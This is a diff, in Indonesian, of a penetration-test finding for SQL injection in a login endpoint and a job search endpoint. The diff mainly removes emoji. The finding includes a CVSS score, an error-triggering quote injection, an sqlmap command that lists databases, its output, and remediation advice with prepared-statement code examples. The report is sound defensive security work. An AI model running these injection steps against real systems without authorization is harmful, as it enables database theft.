@@ -1,21 +1,21 @@
-# 🗃️ Finding 02: SQL Injection
+﻿# Finding 02: SQL Injection
 
 | Item | Detail |
 |------|--------|
 | **Kerentanan** | SQL Injection — Pada parameter login dan search |
-| **Severity** | 🔴 Critical |
+| **Severity** |  Critical |
 | **Skor CVSS** | 9.3 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`) |
 | **Endpoint** | `POST /api/auth/login`<br>`GET /api/jobs/search?keyword=(payload)` |
 
 ---
 
-## 📌 Deskripsi
+## Deskripsi
 
 Terjadi ketika input pengguna dimasukkan langsung ke dalam kueri database tanpa sanitasi atau parameterisasi. Hal ini memungkinkan pengguna tidak berwenang menyisipkan sintaks SQL tambahan untuk memanipulasi logika kueri yang dieksekusi oleh mesin database.
 
 ---
 
-## 💥 Dampak
+## Dampak
 
 - **Kerahasiaan (Confidentiality):** Penyerang dapat membaca seluruh isi data sensitif di dalam database.
 - **Integritas (Integrity):** Penyerang dapat mengubah, menambah, atau menghapus data penting.
@@ -23,9 +23,9 @@ Terjadi ketika input pengguna dimasukkan langsung ke dalam kueri database tanpa 
 
 ---
 
-## 🧪 Langkah Proof of Concept (PoC)
+## Langkah Proof of Concept (PoC)
 
-### 🔹 Langkah 1 — Melakukan Login dengan menyisipkan tanda kutip ( `'` ) pada form username, dan ditemukan error database
+### Langkah 1 — Melakukan Login dengan menyisipkan tanda kutip ( `'` ) pada form username, dan ditemukan error database
 
 **Request:**
 
@@ -48,11 +48,11 @@ Content-Type: application/json
 }
 ```
 
-> 📸 **[Capture Error Database]**
+>  **[Capture Error Database]**
 
 ---
 
-### 🔹 Langkah 2 — Menggunakan request login untuk melakukan pengujian menggunakan SQLMap
+### Langkah 2 — Menggunakan request login untuk melakukan pengujian menggunakan SQLMap
 
 **Command:**
 
@@ -60,11 +60,11 @@ Content-Type: application/json
 sqlmap -r request.txt --batch --dbs
 ```
 
-> 📸 **[Capture Output SQLMap / Command Execution]**
+>  **[Capture Output SQLMap / Command Execution]**
 
 ---
 
-### 🔹 Langkah 3 — Berhasil menampilkan daftar database aplikasi
+### Langkah 3 — Berhasil menampilkan daftar database aplikasi
 
 **Output SQLMap:**
 
@@ -75,11 +75,11 @@ available databases [3]:
 [*] mysql
 ```
 
-> 📸 **[Capture Result / Daftar Database]**
+>  **[Capture Result / Daftar Database]**
 
 ---
 
-## 🛠️ Rekomendasi Perbaikan
+## Rekomendasi Perbaikan
 
 - Gunakan **Parameterized Queries / Prepared Statements** untuk seluruh transaksi kueri database.
 - Terapkan prinsip **Least Privilege** pada akun database yang digunakan oleh aplikasi.
@@ -88,13 +88,13 @@ available databases [3]:
 ### Contoh Implementasi Kode
 
 ```php
-// ✅ Gunakan Prepared Statement (PHP PDO)
+//  Gunakan Prepared Statement (PHP PDO)
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
 $stmt->execute([$username, $password]);
 ```
 
 ```javascript
-// ✅ Gunakan Parameterized Query (Node.js)
+//  Gunakan Parameterized Query (Node.js)
 const [rows] = await db.execute(
   'SELECT * FROM users WHERE username = ? AND password = ?',
   [username, password]
